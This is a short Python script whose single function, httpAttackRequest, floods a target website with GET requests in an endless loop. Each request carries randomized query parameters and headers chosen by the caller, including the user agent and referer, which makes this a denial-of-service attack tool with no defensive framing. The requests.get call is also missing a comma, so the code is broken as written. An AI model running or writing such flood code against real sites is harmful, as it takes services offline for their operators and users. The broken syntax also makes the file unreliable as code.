import requests
import random

def httpAttackRequest(website, userAgent, referer):
	headers = {
	'User-Agent': userAgent, \
	'Cache-Control': 'no-cache', \
	'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7', \
	'Referer': referer, \
	'Keep-Alive': random.randint(110,120), \
	'Connection': 'keep-alive', \
	'Host': website
	}
	
	while True:
		requests.get(website, params={random.randint(1000, 9999): random.randint(1000, 9999)} headers=headers)